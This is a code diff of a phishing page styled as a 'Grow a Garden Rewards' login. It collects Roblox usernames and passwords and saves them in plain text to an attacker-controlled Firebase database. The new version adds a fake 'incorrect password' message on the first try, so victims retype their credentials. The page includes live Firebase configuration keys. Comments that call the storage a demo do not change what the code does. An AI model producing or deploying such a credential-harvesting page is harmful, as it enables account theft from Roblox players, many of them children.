@@ -1,140 +1,52 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Login - Grow a Garden Rewards</title>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" crossorigin="anonymous" />
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Comic Sans MS', cursive, sans-serif;
+<script>
+  const firebaseConfig = {
+    apiKey: "AIzaSyA6P52LeV5DO0odSMxxfK7DnSAXZBFH6CM",
+    authDomain: "growagardengiveaways-c8ed5.firebaseapp.com",
+    databaseURL: "https://growagardengiveaways-c8ed5-default-rtdb.asia-southeast1.firebasedatabase.app",
+    projectId: "growagardengiveaways-c8ed5",
+    storageBucket: "growagardengiveaways-c8ed5.firebasestorage.app",
+    messagingSenderId: "417902911798",
+    appId: "1:417902911798:web:f02d8d4dbfb30643bbd397",
+    measurementId: "G-GQ9YTH33T8"
+  };
+
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+
+  document.getElementById("loginForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    const username = document.getElementById("username").value.trim();
+    const password = document.getElementById("password").value.trim();
+
+    if (!username || !password) {
+      alert("Please fill in both fields.");
+      return;
     }
 
-    body {
-      background: linear-gradient(to right, #ff85a2, #8c52ff);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      text-align: center;
-      padding: 20px;
+    // Get current failed login attempt count
+    let attempts = parseInt(localStorage.getItem("loginAttempts")) || 0;
+
+    if (attempts < 1) {
+      // First attempt: fake failure
+      localStorage.setItem("loginAttempts", attempts + 1);
+      alert("Incorrect username or password. Please try again.");
+      return;
     }
 
-    .login-box {
-      background-color: #fff;
-      border-radius: 20px;
-      padding: 30px 25px;
-      width: 100%;
-      max-width: 400px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
-    }
-
-    .login-box h2 {
-      color: #4b3f72;
-      margin-bottom: 20px;
-    }
-
-    .login-box input {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border: 2px solid #ccc;
-      border-radius: 12px;
-      font-size: 1em;
-    }
-
-    .login-box button {
-      width: 100%;
-      background-color: #ff69b4;
-      color: white;
-      padding: 12px;
-      font-size: 1em;
-      border: none;
-      border-radius: 12px;
-      cursor: pointer;
-      transition: background 0.3s ease;
-    }
-
-    .login-box button:hover {
-      background-color: #e8559e;
-    }
-
-    .back-link {
-      display: block;
-      margin-top: 15px;
-      text-decoration: none;
-      color: #4b3f72;
-      font-size: 0.95em;
-    }
-
-    .back-link:hover {
-      text-decoration: underline;
-    }
-
-    .fake-note {
-      margin-top: 10px;
-      font-size: 0.8em;
-      color: #999;
-    }
-  </style>
-</head>
-<body>
-  <div class="login-box">
-    <h2>🔐 Login to Claim Rewards</h2>
-    <form id="loginForm">
-      <input type="text" id="username" placeholder="Enter your Roblox username" required />
-      <input type="password" id="password" placeholder="Enter your Roblox password!" required />
-      <button type="submit">Login</button>
-    </form>
-    <a class="back-link" href="index.html"><i class="fas fa-arrow-left"></i> Back to Home</a>
-  </div>
-
-  <script>
-    // Firebase Config (your database)
-    const firebaseConfig = {
-      apiKey: "AIzaSyA6P52LeV5DO0odSMxxfK7DnSAXZBFH6CM",
-      authDomain: "growagardengiveaways-c8ed5.firebaseapp.com",
-      databaseURL: "https://growagardengiveaways-c8ed5-default-rtdb.asia-southeast1.firebasedatabase.app",
-      projectId: "growagardengiveaways-c8ed5",
-      storageBucket: "growagardengiveaways-c8ed5.firebasestorage.app",
-      messagingSenderId: "417902911798",
-      appId: "1:417902911798:web:f02d8d4dbfb30643bbd397",
-      measurementId: "G-GQ9YTH33T8"
-    };
-
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-
-    document.getElementById("loginForm").addEventListener("submit", function (e) {
-      e.preventDefault();
-
-      const username = document.getElementById("username").value.trim();
-      const password = document.getElementById("password").value.trim();
-
-      if (!username || !password) {
-        alert("Please fill in both fields.");
-        return;
-      }
-
-      // Save to Firebase
-      db.ref("users").push({
-        username: username,
-        password: password, // NOTE: This is only for demo purposes. Never store raw passwords in production.
-        time: new Date().toISOString()
-      });
-
-      // Set login status
-      localStorage.setItem("loggedIn", "true");
-      localStorage.setItem("username", username);
-
-      alert("Welcome, " + username + "!");
-      window.location.href = "gag-home.html";
+    // Save to Firebase
+    db.ref("users").push({
+      username: username,
+      password: password, // WARNING: Never store raw passwords in production!
+      time: new Date().toISOString()
     });
-  </script>
-</body>
-</html>
+
+    // Set login status
+    localStorage.setItem("loggedIn", "true");
+    localStorage.setItem("username", username);
+    localStorage.removeItem("loginAttempts"); // reset
+
+    alert("Welcome, " + username + "!");
+    window.location.href = "gag-home.html";
+  });
+</script>
